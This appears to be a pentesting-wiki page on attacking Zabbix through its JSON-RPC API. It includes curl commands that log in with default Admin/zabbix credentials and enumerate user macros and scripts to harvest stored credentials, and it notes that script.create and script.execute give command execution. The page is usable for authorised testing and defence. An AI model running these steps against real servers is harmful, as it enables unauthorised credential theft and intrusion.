---
title: "API: the Zabbix JSON-RPC interface"
description: "Zabbix exposes a JSON-RPC API at /api_jsonrpc.php that mirrors the UI's capabilities. After authenticating with user.login to obtain a token (or using an API token), an attacker drives the whole platform programmatically: enumerating users, hosts, items, scripts, and macros, and, with sufficient rights, creating the objects that lead to code execution."
keywords:
  - zabbix api
  - json-rpc
  - user.login
  - api token
  - api_jsonrpc.php
---

# API

The Zabbix API is a JSON-RPC 2.0 endpoint at `/api_jsonrpc.php` that exposes essentially everything the web UI can do, which makes it the attacker's primary interface once access is obtained. Authentication is via `user.login` (returning a session token used in the `auth` field of subsequent calls) or, on newer versions, a pre-created API token sent as a bearer credential. With a token, an attacker enumerates and manipulates objects programmatically: `user.get`, `host.get`, `item.get`, `script.get`, and `usermacro.get` read the environment and its stored secrets, and `host.create`/`item.create`/`script.create`/`script.execute` create the objects used for code execution. Scripting the API is faster and quieter than the UI and is how most Zabbix post-authentication attacks are driven.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# login -> token
TOK=$(curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}' | jq -r .result)
# enumerate secrets-bearing objects
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"usermacro.get","params":{"output":"extend"},"auth":"'"$TOK"'","id":1}'   # macros (often creds)
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"script.get","params":{"output":"extend"},"auth":"'"$TOK"'","id":1}'
# newer: an API token is sent as a bearer header instead of the auth field
curl -sk $Z -H "$H" -H 'Authorization: Bearer <api-token>' -d '{"jsonrpc":"2.0","method":"host.get","params":{},"id":1}'
```

## Exploitation notes

- `user.login` returns a session token equivalent to a logged-in session; it is the credential for all further calls, and a stolen session/token ([Session and token theft](../authentication/session-and-token-theft.md)) substitutes for it.
- `usermacro.get` is high-value: user macros ({$...}) frequently store the credentials Zabbix uses to monitor hosts (SNMP strings, SSH/IPMI/DB passwords), so reading them harvests estate credentials.
- The API is the execution driver too: with sufficient role, `script.create` + `script.execute` runs commands on the server/agent, see [Global and alert scripts](../code-execution/global-and-alert-scripts.md).
- Rights are role-scoped, so what the API returns depends on the user; enumerate `role.get`/`usergroup.get` to understand the identity's reach.

## References

- [Zabbix API reference](https://www.zabbix.com/documentation/current/en/manual/api)
- [HackTricks: Zabbix API](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
